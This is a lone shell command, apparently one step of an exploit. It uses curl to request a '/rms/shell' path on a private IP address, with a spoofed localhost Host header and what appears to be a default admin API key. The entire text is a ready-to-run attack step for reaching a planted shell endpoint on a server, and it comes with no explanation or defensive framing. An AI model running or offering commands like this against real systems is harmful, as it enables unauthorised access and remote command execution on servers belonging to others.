curl -is -X 'GET' "http://172.31.24.111/rms/shell" \
 -H 'Host: 127.0.0.1:9080' \
 -H 'X-API-KEY: edd1c9f034335f136f87ad84b625c8f1' \
 -H 'Accept: */*' \
 -H 'Accept-Encoding: utf8' \
 -H 'Connection: close' -o- 2>&1 & fg 1
